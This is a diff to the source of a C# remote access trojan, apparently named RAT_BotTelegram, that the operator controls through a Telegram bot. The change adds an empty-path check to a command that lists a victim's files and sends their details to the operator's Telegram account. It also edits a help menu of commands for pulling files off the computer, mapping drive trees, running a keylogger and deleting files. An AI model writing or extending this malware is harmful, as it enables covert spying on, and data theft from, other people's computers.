@@ -82,10 +82,15 @@ namespace RAT_BotTelegram {
             }
         }
         private static async void ListarFiles(string Path) {
-            foreach (var file in Tools.GetFile(Path)) {
-                string FData = infoFile(file);
-                await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
+            if (Path == "") {
+                SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
+            } else {
+                foreach (var file in Tools.GetFile(Path)) {
+                    string FData = infoFile(file);
+                    await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
+                }
             }
+            
         }
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
             var message = messageEventArgs.Message;
@@ -347,7 +352,7 @@ namespace RAT_BotTelegram {
                   "\n/Get_FilesAll          |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
                   "\n/Get_DirFiles      |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
                   "\n/Dir     <Path>       /Dir C:\\User\\Photos and videos" +  // Lista los archivos de la carpeta y las subscarpetas.
-                  "\n/Dir_DirectoyDisk  <Path>       |Menu| Only Directory Tree Drive" +  // Lista Arbol de solo ditectorios
+                  "\n/Dir_DirectoyDisk     |Menu| Only Directory Tree Drive" +  // Lista Arbol de solo ditectorios
                   "\n/Dir_FilesDisk  <Path>       |Menu| Only Files Tree Drive" +  // Lista Arbol de todos loa rchivos.
                   "\n/Keylogger          |Menu| <keylogger Options >" +
                   "\n/Delete_File <Path>" +
